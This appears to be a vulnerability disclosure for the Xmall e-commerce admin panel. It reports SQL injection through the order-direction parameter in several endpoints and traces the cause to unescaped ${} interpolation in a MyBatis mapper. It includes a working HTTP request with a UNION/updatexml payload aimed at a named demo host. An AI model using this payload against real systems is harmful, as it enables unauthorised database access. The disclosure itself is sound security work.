| [Suggested description] Xmall was discovered to contain a SQL injection vulnerability via the orderDir parameter.  [Vulnerability Type] SQLi  [Vendor of Product] <https://github.com/Exrick/xmall>  [Affected Product Code Base] all version  [Affected Component]   * /item/list * /item/listSearch * /sys/log * /order/list * /member/list (need time-based blind injection) * /member/list/remove   [Attack Type] Remote  [Vulnerability details] Send the payload below to the interface `/item/list`  ``` GET /item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D=&search%5Bregex%5D=false&cid=-1&_=1679041197136 HTTP/1.1 Host: xmadmin.exrick.cn Accept: application/json, text/javascript, */*; q=0.01 DNT: 1 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Referer: http://xmadmin.exrick.cn/product-list Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,or;q=0.7 Cookie: JSESSIONID=359A406116392BB0456356EFBCF068FC Connection: close  ```  [image](https://user-images.githubusercontent.com/39017274/225889777-4953bd74-9704-4d0c-87e9-c84ab0b3c9f5.png)  [Impact Code execution] true  [Cause of vulnerability] In the `/item/list` interface, the `order[0][dir]` parameter is not filtered and passed into the `getItemList` function. [image](https://user-images.githubusercontent.com/39017274/225890553-d65320e6-106d-4cc8-bd72-8027a639d754.png) Then it is passed into the `selectItemByCondition` function. [image](https://user-images.githubusercontent.com/39017274/225891440-5df4d921-5b6f-4b3a-b30e-abd1aef731e3.png) In `xmall-manager\xmall-manager-dao\src\main\java\cn\exrick\manager\mapper\TbItemMapper.xml`, the `orderDir` parameter is used in `${}` format, leading to a SQL injection vulnerability. [image](https://user-images.githubusercontent.com/39017274/225891751-a5baebc1-cb79-4e00-a36c-75b1813dd16a.png)  And there are the other similar interfaces:   * /item/listSearch * /sys/log * /order/list * /member/list (need time-based blind injection) * /member/list/remove (need time-based blind injection)   That's all, thanks. |
